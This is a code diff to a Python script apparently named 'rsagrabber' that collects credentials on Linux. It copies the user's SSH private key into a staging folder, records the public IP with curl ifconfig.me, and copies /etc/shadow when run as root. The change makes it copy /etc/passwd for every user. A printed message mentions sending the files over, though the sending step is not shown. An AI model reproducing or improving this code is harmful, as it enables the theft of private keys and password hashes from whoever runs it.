@@ -15,9 +15,9 @@ if platform == "linux":
         os.system('mkdir ~/rsagrabber')
         os.system('cp ~/.ssh/id_rsa ~/rsagrabber')
         os.system('curl ifconfig.me > ~/rsagrabber/ipadd.txt')
+        os.system('cp /etc/passwd ~/rsagrabber')
         if getpass.getuser() == "root":
-            print("You are root, grabbing passwd and shadow")
-            os.system('cp /etc/passwd ~/rsagrabber')
+            print("You are root, grabbing shadow")
             os.system('cp /etc/shadow ~/rsagrabber')
         else:
             print("You are not using root. Not sending shadow and passwd over.")
